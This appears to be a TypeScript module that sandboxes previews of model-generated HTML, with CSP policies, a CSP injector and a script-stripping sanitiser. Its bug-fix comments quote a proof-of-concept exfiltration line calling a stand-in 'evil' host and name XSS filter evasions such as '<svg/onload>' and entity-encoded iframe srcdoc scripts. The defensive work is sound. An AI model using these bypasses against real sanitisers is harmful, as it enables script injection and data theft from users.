/**
 * Content-Security-Policy for the sandboxed HTML/JS preview.
 *
 * The preview runs model/user-generated HTML+JS in an in-app WebView. It has no
 * app tokens (baseUrl https://localhost/, no cookies), but without a CSP the JS
 * could still make arbitrary network egress. This policy locks down the document:
 *  - default-src 'none': deny everything by default
 *  - script-src 'unsafe-inline' https: / style-src 'unsafe-inline' https: inline
 *    code runs (the preview's purpose); https external scripts/styles load
 *  - img/font/media: data/blob/https only (passive rendering)
 *  - connect-src 'none': JS cannot fetch/XHR/WebSocket anywhere (no exfiltration)
 *  - base-uri 'none' / form-action 'none': no <base> hijack, no form submits
 *
 * Note: a meta CSP `sandbox` directive is NOT equivalent to an iframe `sandbox`
 * attribute (browsers ignore sandbox in meta CSP per the HTML spec). Opaque
 * origin / storage isolation come from the WebView config (`domStorageEnabled`
 * off, no shared cookies) — not from this meta tag. We still list
 * `sandbox allow-scripts` for environments that honor it; do not treat it as
 * a guarantee of iframe-style isolation.
 */
export const PREVIEW_CSP = [
  "default-src 'none'",
  "style-src 'unsafe-inline' https:",
  "script-src 'unsafe-inline' https:",
  "img-src data: blob: https:",
  "font-src data: https:",
  "media-src data: blob: https:",
  "connect-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "sandbox allow-scripts",
].join("; ");

/**
 * CSP for the math WebView (MathJax path).
 *
 * Unlike the user-HTML preview, the math WebView renders a *trusted* template
 * (our own LaTeX + the MathJax CDN script) — not model-generated HTML/JS. So
 * it can safely allow `connect-src` to the MathJax CDN: MathJax's loader
 * fetches its tex extension packages (ams, noerrors, nundefined) at runtime,
 * which the strict `connect-src 'none'` preview CSP blocks — causing the
 * render to fall back to the error div. Everything else stays as locked-down
 * as the preview CSP.
 */
export const MATH_PREVIEW_CSP = [
  "default-src 'none'",
  "style-src 'unsafe-inline' https:",
  "script-src 'unsafe-inline' https:",
  "img-src data: blob: https:",
  "font-src data: https:",
  "media-src data: blob: https:",
  "connect-src https://cdn.jsdelivr.net",
  "base-uri 'none'",
  "form-action 'none'",
  "sandbox allow-scripts",
].join("; ");

/**
 * CSP for the PDF preview WebView (pdf.js).
 *
 * The PDF preview loads pdf.js + its worker from cdnjs and renders an
 * inlined base64 PDF. Unlike the user-HTML preview, pdf.js legitimately
 * needs to fetch from cdnjs (the worker, cmaps, etc.) — the strict
 * `connect-src 'none'` of PREVIEW_CSP breaks it. We still lock everything
 * else down: only cdnjs may be reached, no other egress, no forms, no base
 * hijack. The PDF data itself is inlined (no fetch).
 */
export const PDF_PREVIEW_CSP = [
  "default-src 'none'",
  "style-src 'unsafe-inline' https:",
  "script-src 'unsafe-inline' https:",
  "img-src data: blob: https:",
  "font-src data: https:",
  "media-src data: blob: https:",
  "connect-src https://cdnjs.cloudflare.com",
  "base-uri 'none'",
  "form-action 'none'",
  "sandbox allow-scripts",
].join("; ");

/**
 * Replace raw-text/CDATA-like regions (script, style, comments, textarea,
 * title) with equal-length whitespace, preserving the string's length so
 * indices found in the result stay valid against the original string.
 *
 * BUG FIX (was a confirmed sandbox escape): injectPreviewCsp() used to find
 * "the <head>" with a plain textual `.search()` — no HTML/JS-context
 * awareness. A document that puts a decoy `<head` inside a <script> comment
 * (or <style>/HTML comment/<textarea>/<title>) BEFORE the real <head> tag
 * got its CSP <meta> spliced into that inert block instead of the real
 * document — where it's never parsed as a tag — leaving the actual <head>
 * with no CSP at all. Confirmed PoC: a document opening with
 * `<script>// <head>\nfetch("https://evil/steal?...")</script>` executed
 * that fetch with zero CSP applied (connect-src 'none' never existed in the
 * real document), fully defeating the "no exfiltration" guarantee this file
 * documents. Masking these regions before searching makes the head/html
 * lookup see only real markup, matching how a browser's own HTML tokenizer
 * would never treat a "<head" inside one of these as a tag either.
 */
function maskRawTextRegions(html: string): string {
  return html.replace(
    /<!--[\s\S]*?-->|<script\b[^>]*>[\s\S]*?<\/script\s*>|<style\b[^>]*>[\s\S]*?<\/style\s*>|<textarea\b[^>]*>[\s\S]*?<\/textarea\s*>|<title\b[^>]*>[\s\S]*?<\/title\s*>/gi,
    (match) => " ".repeat(match.length),
  );
}

/** Inject the sandbox CSP meta into an HTML document (bare or full). */
export function injectPreviewCsp(html: string, csp: string = PREVIEW_CSP): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  const masked = maskRawTextRegions(html);

  const headMatch = /<head(\s[^>]*)?>/i.exec(masked);
  if (headMatch && headMatch.index != null) {
    const headIdx = headMatch.index;
    const headTag = html.slice(headIdx, headIdx + headMatch[0].length);
    // Meta CSP only constrains resources after it is parsed. Drop real
    // <script> blocks that appear before the (now decoy-proof) real <head>
    // so they cannot run unconstrained.
    const before = html
      .slice(0, headIdx)
      .replace(/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, "")
      .replace(/<\s*script\b[^>]*\/>/gi, "");
    return before + headTag + meta + html.slice(headIdx + headMatch[0].length);
  }

  const htmlMatch = /<html(\s[^>]*)?>/i.exec(masked);
  if (htmlMatch && htmlMatch.index != null) {
    const at = htmlMatch.index + htmlMatch[0].length;
    return html.slice(0, at) + `<head>${meta}</head>` + html.slice(at);
  }
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>`;
}

/** Escape a string embedded in a JS template literal inside a <script> block. */
export function escapeForInlineJsTemplate(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/`/g, "\\`")
    .replace(/\${/g, "\\${")
    .replace(/<\/script>/gi, "<\\/script>");
}

// Matches whitespace and C0 control characters, built via String.fromCharCode
// (not a literal char class) so no raw control bytes live in this source file.
const CONTROL_OR_WHITESPACE = new RegExp(
  "[\\s" + Array.from({ length: 0x20 }, (_, i) => String.fromCharCode(i)).join("") + "]",
  "g",
);

/**
 * Remove `<script>...</script>` blocks and inline event handlers from HTML.
 *
 * Used for the "Open in browser" / share paths, which hand model-generated HTML
 * to the system browser. The system browser runs `<script>` unsandboxed (no CSP,
 * same origin as the browser), so untrusted model JS must never reach it.
 * Interactive previews run in the in-app WebView instead, which applies the CSP
 * above. Stripping scripts here keeps the browser path a static view only.
 */
export function stripScripts(html: string): string {
  // BUG FIX (was a confirmed bypass): this used to strip only <script> tags
  // and whitespace-preceded on*="" handlers, which two well-known XSS-filter
  // evasion techniques survive unchanged: (1) `/` is a valid inter-attribute
  // separator in HTML, not just whitespace — `<svg/onload=...>` fires
  // automatically on render because the old regexes required `\s` before
  // `on\w+`; (2) `<iframe srcdoc="&lt;script&gt;...&lt;/script&gt;">` — the
  // browser HTML-decodes srcdoc before parsing it as the iframe's document,
  // so an entity-encoded <script> inside it executes on load, and the old
  // code never looked for the literal string "<script" inside an
  // entity-encoded attribute value at all. Both are zero-click. Also strips
  // javascript:/vbscript: URLs (a tap-triggered vector) and meta-refresh (a
  // zero-click redirect) — this function's own contract is that its output
  // is a fully static view handed to an unsandboxed system browser.
  let out = html
    .replace(/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, "")
    .replace(/<\s*script\b[^>]*\/>/gi, "")
    .replace(/[\s/]on\w+\s*=\s*"[^"]*"/gi, "")
    .replace(/[\s/]on\w+\s*=\s*'[^']*'/gi, "")
    .replace(/[\s/]on\w+\s*=\s*[^\s>]+/gi, "")
    .replace(/\ssrcdoc\s*=\s*"[^"]*"/gi, "")
    .replace(/\ssrcdoc\s*=\s*'[^']*'/gi, "")
    .replace(/<\s*meta\b[^>]*\shttp-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, "");

  out = out.replace(
    /\s(href|src|action|formaction|data)\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi,
    (match, _attr: string, value: string) => {
      const unquoted = value.replace(/^["']|["']$/g, "");
      // Strip whitespace and control characters — browsers ignore
      // them inside a URL scheme, so a scheme with an embedded tab/newline
      // still reads as its base scheme after normalization.
      const cleaned = unquoted.replace(CONTROL_OR_WHITESPACE, "").toLowerCase();
      if (cleaned.startsWith("javascript:") || cleaned.startsWith("vbscript:")) {
        return "";
      }
      return match;
    },
  );
  return out;
}
